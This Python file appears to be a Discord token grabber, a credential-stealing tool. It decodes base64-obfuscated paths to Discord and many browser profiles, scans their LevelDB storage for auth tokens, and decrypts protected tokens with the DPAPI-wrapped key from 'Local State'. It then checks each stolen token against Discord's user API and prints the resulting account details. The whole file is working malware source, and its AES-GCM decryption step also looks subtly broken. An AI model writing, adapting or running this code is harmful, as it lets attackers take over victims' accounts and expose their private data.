import os
import re
import base64
import json
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from win32crypt import CryptUnprotectData

class TokenGrabber:
    @staticmethod
    def object_to_dict(obj):
        return json.loads(json.dumps(obj, default=lambda o: o.__dict__))

    @staticmethod
    def object_to_array(obj):
        return json.loads(json.dumps(obj, default=lambda o: o.__dict__))

    @staticmethod
    def json_to_dict(json_str):
        return json.loads(json_str)

    @staticmethod
    def dict_to_json(dictionary):
        return json.dumps(dictionary)

    @staticmethod
    def grab_tokens(leveldb_path, localstate_path):
        tokens = []
        basic_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
        new_regex = re.compile(r'mfa\.[\w-]{84}')
        encrypted_regex = re.compile(r'(dQw4w9WgXcQ:)([^.*\\[\'(.*)\'\\].*$][^\"]*)')

        db_files = [os.path.join(root, file) for root, _, files in os.walk(leveldb_path) for file in files if file.endswith('.ldb')]
        for file in db_files:
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:  # Ignore invalid characters
                contents = f.read()

            match1 = basic_regex.search(contents)
            if match1:
                tokens.append(match1.group())
                print(f"Token found: {match1.group()}")  # Output the token to the console
            match2 = new_regex.search(contents)
            if match2:
                tokens.append(match2.group())
                print(f"Token found: {match2.group()}")  # Output the token to the console

            match3 = encrypted_regex.search(contents)
            if match3:
                token = TokenGrabber.decrypt_token(base64.b64decode(match3.group().split("dQw4w9WgXcQ:")[1]), localstate_path)
                tokens.append(token)
                print(f"Decrypted token found: {token}")  # Output the decrypted token to the console

        return tokens

    @staticmethod
    def decrypt_key(path):
        with open(path, 'r', encoding='utf-8') as f:
            deserialized_file = json.load(f)
        encrypted_key = base64.b64decode(deserialized_file['os_crypt']['encrypted_key'])[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    @staticmethod
    def decrypt_token(buffer, localstate_path):
        encrypted_data = buffer[15:]
        nonce = buffer[3:15]
        cipher = AES.new(TokenGrabber.decrypt_key(localstate_path), AES.MODE_GCM, nonce=nonce)
        decrypted_bytes = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        return decrypted_bytes.decode('utf-8').rstrip("\r\n\0")

    @staticmethod
    def grab():
        pre_done = []
        appdata = base64.b64decode("XEFwcERhdGE=").decode('utf-8')
        user = os.path.expanduser("~")
        locallevel = base64.b64decode("XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYg==").decode('utf-8')
        paths = [
            "XFJvYW1pbmdcZGlzY29yZA==", "XFJvYW1pbmdcZGlzY29yZHB0Yg==", "XFJvYW1pbmdcZGlzY29yZGNhbmFyeQ==",
            "XFJvYW1pbmdcZGlzY29yZGRldmVsb3BtZW50", "XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxl",
            "XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl", "XExvY2FsXEFtaWdvXFVzZXIgRGF0YQ==",
            "XExvY2FsXFRvcmNoXFVzZXIgRGF0YQ==", "XExvY2FsXEtvbWV0YVxVc2VyIERhdGE=", "XExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHQ=",
            "XExvY2FsXE9yYml0dW1cVXNlciBEYXRh", "XExvY2FsXENlbnRCcm93c2VyXFVzZXIgRGF0YQ==", "XExvY2FsXDdTdGFyXDdTdGFyXFVzZXIgRGF0YQ==",
            "XExvY2FsXFNwdXRuaWtcU3B1dG5pa1xVc2VyIERhdGE=", "XExvY2FsXFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHQ=",
            "XExvY2FsXEdvb2dsZVxDaHJvbWUgU3hTXFVzZXIgRGF0YQ==", "XExvY2FsXEVwaWMgUHJpdmFjeSBCcm93c2VyXFVzZXIgRGF0YQ==",
            "XExvY2FsXHVDb3pNZWRpYVxVcmFuXFVzZXIgRGF0YVxEZWZhdWx0", "XExvY2FsXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0",
            "XExvY2FsXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0", "XExvY2FsXE9wZXJhIFNvZnR3YXJlXE9wZXJhIE5lb25cVXNlciBEYXRhXERlZmF1bHQ=",
            "XExvY2FsXEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdA=="
        ]
        for i in paths:
            localdb = user + appdata + base64.b64decode(i).decode('utf-8') + locallevel
            localstate = user + appdata + base64.b64decode(i).decode('utf-8') + "\\Local State"
            if "\\Default" in localstate:
                localstate = localstate.replace("\\Default", "")
            if os.path.exists(localdb) and os.path.exists(localstate):
                pre_done.extend(TokenGrabber.grab_tokens(localdb, localstate))

        pre_done = list(set(pre_done))
        done = []
        for i in pre_done:
            try:
                headers = {"authorization": i}
                response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
                done.append(f"{i}: {response.text}")
            except:
                pass

        return done

if __name__ == "__main__":
    tokens = TokenGrabber.grab()  # Ensure grab is correctly called
    print("Tokens and responses:")
    for token in tokens:
        print(token)